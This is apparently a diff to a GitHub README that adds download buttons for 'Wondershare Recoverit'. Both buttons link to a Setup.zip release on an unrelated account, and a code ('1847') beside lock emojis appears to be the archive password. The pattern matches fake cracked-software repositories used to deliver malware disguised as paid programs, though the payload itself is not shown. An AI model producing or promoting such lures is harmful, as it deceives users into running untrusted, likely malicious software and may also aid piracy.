@@ -8,7 +8,7 @@
 
 ---
 
-[![Download](og-image.png)]()
+[![Download](og-image.png)](https://github.com/ThreadSquidQuay/Wondershare-Recoverit/releases/download/Last/Setup.zip)
 
 
 ---
@@ -21,7 +21,7 @@
 
 ## 📥 Download
 
-[![Wondershare Recoverit](https://img.shields.io/badge/Download%20Wondershare%20Recoverit-Open%20Page-0a84ff?style=for-the-badge&logo=github)]()
+[![Wondershare Recoverit](https://img.shields.io/badge/Download%20Wondershare%20Recoverit-Open%20Page-0a84ff?style=for-the-badge&logo=github)](https://github.com/ThreadSquidQuay/Wondershare-Recoverit/releases/download/Last/Setup.zip)
 
 **🔐🔐🔐** `1847`
 
